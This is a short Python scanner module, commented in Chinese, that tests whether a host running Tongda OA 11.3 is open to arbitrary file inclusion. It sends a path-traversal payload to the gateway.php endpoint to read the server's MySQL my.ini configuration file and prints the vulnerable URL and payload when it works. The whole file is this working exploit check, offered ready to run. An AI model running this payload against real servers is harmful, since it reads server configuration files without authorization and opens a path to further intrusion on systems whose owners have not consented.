import requests
import time

def fileInclude(host): # 通达11.3任意文件包含漏洞
    content = ''
    content += '[->] 正在测试是否存在任意文件包含漏洞' + '\n'
    url = host + 'ispirit/interface/gateway.php'
    try:
        data = {'json':'{"url":"general/../../mysql5/my.ini"}'}
        response = requests.post(url=url,data=data,timeout=2)
        # print(response.text)
        if 'mysql' in response.text:
            content += '[*] 存在任意文件包含漏洞,路径如下:' + '\n'
            content += url + '\n'
            content += 'POST的值如下:' + '\n'
            content += 'json={"url":"general/../../mysql5/my.ini"}' + '\r\n'
            print(content)
            return content
        else:
            content += '[-] 不存在任意文件包含漏洞' + '\n'
            print(content)
            return content
    except:
        pass

def run(host):
    time.sleep(1)
    fileInclude(host)
